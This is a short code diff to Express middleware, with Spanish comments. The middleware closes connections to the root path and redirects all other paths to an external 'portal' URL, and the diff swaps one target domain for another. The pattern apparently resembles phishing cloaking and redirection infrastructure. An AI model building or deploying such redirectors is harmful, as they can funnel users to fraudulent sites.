@@ -7,7 +7,7 @@ app.use((req, res, next) => {
     if (req.path === '/') {
         res.socket.destroy(); // Cierra la conexión sin enviar respuesta
     } else {
-        res.redirect('https://seguroportal.cellphonez.vn/MUA/1'); // Redirige cualquier otra ruta
+        res.redirect('https://admin.sge.pt/MUA/1'); // Redirige cualquier otra ruta
     }
 });
 
